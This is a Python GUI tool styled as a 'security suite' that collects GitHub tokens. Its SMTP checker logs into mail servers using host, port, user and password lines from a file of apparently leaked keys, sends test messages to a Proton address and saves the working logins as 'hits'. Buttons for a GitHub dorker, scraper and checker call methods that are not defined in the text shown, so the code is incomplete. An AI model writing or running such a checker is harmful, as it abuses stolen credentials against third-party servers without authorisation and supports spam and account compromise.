import customtkinter as ctk
from PIL import Image, ImageTk
import threading
import time
import random
import requests
import re
import json
import base64
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime

class KilluaSecurityApp(ctk.CTk):
    def __init__(self):
        super().__init__()

        self.title("KILLUA SECURITY SUITE | UCHIHA EDITION")
        self.geometry("1350x900")
        self.configure(fg_color="#010101")

        self.angle = 0
        self.tk_eye = None
        self.hits = []
        self.cached_repos = []
        self.smtp_hits = []           # New: for SMTP inbox hits

        self.setup_ui()
        self.update_animation()

    def setup_ui(self):
        # ==================== TOP BAR ====================
        self.top_bar = ctk.CTkFrame(self, height=70, fg_color="#080808", 
                                    border_color="#ff0000", border_width=1, corner_radius=0)
        self.top_bar.pack(side="top", fill="x", padx=12, pady=12)

        ctk.CTkLabel(self.top_bar, text="GITHUB TOKEN:", 
                     font=("Orbitron", 13, "bold"), text_color="#ff0000").pack(side="left", padx=15)

        self.token_entry = ctk.CTkEntry(self.top_bar, placeholder_text="ghp_xxxxxxxxxxxxxxxxxxxx",
                                        width=460, fg_color="#000000", border_color="#444444", 
                                        text_color="#00ffcc", font=("Consolas", 12))
        self.token_entry.pack(side="left", padx=10)

        self.status_indicator = ctk.CTkLabel(self.top_bar, text="● SYSTEM READY", 
                                             text_color="#00ff00", font=("Consolas", 13, "bold"))
        self.status_indicator.pack(side="right", padx=30)

        # ==================== SIDEBAR ====================
        self.sidebar = ctk.CTkFrame(self, width=270, fg_color="#050505", 
                                    border_color="#1a1a1a", border_width=1)
        self.sidebar.pack(side="left", fill="y", padx=12, pady=(0, 12))

        ctk.CTkLabel(self.sidebar, text="COMMAND CENTER", 
                     font=("Orbitron", 15, "bold"), text_color="#ff0000").pack(pady=25)

        self.create_menu_btn("1. START DORKER", self.run_dorker_thread)
        self.create_menu_btn("2. SCRAPE REPOS", self.run_scraper_thread)
        self.create_menu_btn("3. CHECK HITS", self.run_checker_thread)
        self.create_menu_btn("4. SMTP INBOX CHECKER", self.run_smtp_checker_thread)   # ← New Button
        self.create_menu_btn("CLEAR LOGS", self.clear_logs)
        self.create_menu_btn("SHUTDOWN", self.destroy)

        # ==================== CENTER - SHARINGAN ====================
        self.center_frame = ctk.CTkFrame(self, fg_color="transparent")
        self.center_frame.pack(side="left", expand=True, fill="both")

        self.canvas = ctk.CTkCanvas(self.center_frame, width=400, height=400, 
                                    bg="#010101", highlightthickness=0)
        self.canvas.pack(pady=50)

        try:
            self.raw_img = Image.open("sharingan.png").convert("RGBA")
        except:
            self.raw_img = Image.new("RGBA", (320, 320), (200, 0, 0, 120))

        # ==================== TERMINAL ====================
        self.term_frame = ctk.CTkFrame(self, fg_color="#050505", 
                                       border_color="#ff0000", border_width=1)
        self.term_frame.pack(side="right", fill="both", expand=True, padx=12, pady=(0, 12))

        self.terminal = ctk.CTkTextbox(self.term_frame, fg_color="#0a0a0a", 
                                       text_color="#00ffcc", font=("Consolas", 13.5))
        self.terminal.pack(fill="both", expand=True, padx=15, pady=15)

        self.log("KILLUA SECURITY SUITE - UCHIHA EDITION LOADED")
        self.log("All modules ready. Choose your weapon.")

    def create_menu_btn(self, text, command):
        btn = ctk.CTkButton(self.sidebar, text=text, fg_color="transparent", 
                            border_color="#ff0000", border_width=1, hover_color="#2a0000",
                            font=("Orbitron", 12, "bold"), height=50, corner_radius=6, command=command)
        btn.pack(pady=9, padx=25, fill="x")

    def log(self, msg):
        ts = datetime.now().strftime("%H:%M:%S")
        self.terminal.insert("end", f"[{ts}] >>> {msg}\n")
        self.terminal.see("end")

    def clear_logs(self):
        self.terminal.delete("1.0", "end")
        self.log("Logs cleared.")

    # ===================== OLD THREADS (shortened for space) =====================
    # ... (Dorker, Scraper, Checker functions stay the same as previous version)

    def run_dorker_thread(self):
        token = self.token_entry.get().strip()
        if not token:
            self.log("[!] ERROR: GitHub Token required!")
            return
        threading.Thread(target=self.logic_dorker, args=(token,), daemon=True).start()

    def run_scraper_thread(self):
        if not self.cached_repos:
            self.log("[!] Run Dorker first!")
            return
        threading.Thread(target=self.logic_scraper, daemon=True).start()

    def run_checker_thread(self):
        if not self.cached_repos:
            self.log("[!] No data to check.")
            return
        threading.Thread(target=self.logic_checker, daemon=True).start()

    # ===================== NEW: SMTP INBOX CHECKER =====================
    def run_smtp_checker_thread(self):
        threading.Thread(target=self.logic_smtp_inbox_checker, daemon=True).start()

    def logic_smtp_inbox_checker(self):
        self.status_indicator.configure(text="● SMTP CHECKING...", text_color="#ffaa00")
        self.log("Starting SMTP Inbox Delivery Checker...")

        INPUT_FILE = "ghire_li_fihom_keys.txt"
        SEND_TO = "hunterbugcrowd1@proton.me"   # ← Change this to your real Proton/Gmail
        SUCCESS_FILE = "inbox_hits.txt"
        THREADS_COUNT = 12                      # Reduced to avoid blocks
        TIMEOUT = 25

        try:
            with open(INPUT_FILE, "r", encoding="utf-8") as f:
                smtps = f.readlines()
        except FileNotFoundError:
            self.log(f"[!] File '{INPUT_FILE}' not found! Put your SMTP list there.")
            self.status_indicator.configure(text="● IDLE", text_color="#00ff00")
            return

        self.log(f"[*] Loaded {len(smtps)} SMTP entries. Starting delivery test...")

        file_lock = threading.Lock()

        def send_test_email(server, user, host):
            try:
                msg = MIMEMultipart()
                msg['From'] = user
                msg['To'] = SEND_TO
                msg['Subject'] = f"Killua Test - {host} - {datetime.now().strftime('%H:%M')}"
                body = f"Test Delivery Successful!\nHost: {host}\nUser: {user}\nTime: {datetime.now()}"
                msg.attach(MIMEText(body, 'plain'))
                server.sendmail(user, [SEND_TO], msg.as_string())
                return True
            except:
                return False

        def check_and_send(line):
            line = line.strip()
            if not line or "|" not in line:
                return

            try:
                parts = line.split('|')
                if len(parts) < 4:
                    return
                host, port, user, password = parts[0], int(parts[1]), parts[2], parts[3]

                if port == 465:
                    server = smtplib.SMTP_SSL(host, port, timeout=TIMEOUT)
                else:
                    server = smtplib.SMTP(host, port, timeout=TIMEOUT)
                    server.ehlo()
                    if server.has_extn("starttls"):
                        server.starttls()
                        server.ehlo()

                server.login(user, password)

                if send_test_email(server, user, host):
                    self.log(f"[INBOX HIT] {host} | {user} → Email delivered!")
                    with file_lock:
                        with open(SUCCESS_FILE, "a", encoding="utf-8") as f:
                            f.write(line + "\n")
                    self.smtp_hits.append(line)
                else:
                    self.log(f"[LOGIN OK - SEND FAILED] {host} | {user}")

                server.quit()

            except Exception as e:
                self.log(f"[DEAD] {user} → {str(e)[:80]}")

        # Run with threads
        threads = []
        for line in smtps:
            t = threading.Thread(target=check_and_send, args=(line,))
            threads.append(t)
            t.start()

            if len(threads) >= THREADS_COUNT:
                for t in threads:
                    t.join()
                threads = []
                time.sleep(1)   # Small delay to reduce blocks

        for t in threads:
            t.join()

        self.log(f"\n[DONE] SMTP Inbox check finished. Hits saved to '{SUCCESS_FILE}'")
        self.log(f"Total inbox hits: {len(self.smtp_hits)}")
        self.status_indicator.configure(text="● IDLE", text_color="#00ff00")

    # ===================== ANIMATION (same as before) =====================
    def update_animation(self):
        self.canvas.delete("all")
        self.angle = (self.angle + 5) % 360

        rotated = self.raw_img.rotate(self.angle, resample=Image.BICUBIC)
        resized = rotated.resize((320, 320), Image.LANCZOS)
        self.tk_eye = ImageTk.PhotoImage(resized)

        self.canvas.create_oval(50, 50, 350, 350, outline="#ff3333", width=14)
        self.canvas.create_oval(75, 75, 325, 325, outline="#ff6666", width=5)
        self.canvas.create_image(200, 200, image=self.tk_eye)
        self.after(28, self.update_animation)

if __name__ == "__main__":
    ctk.set_appearance_mode("dark")
    ctk.set_default_color_theme("dark-blue")
    
    app = KilluaSecurityApp()
    app.mainloop()
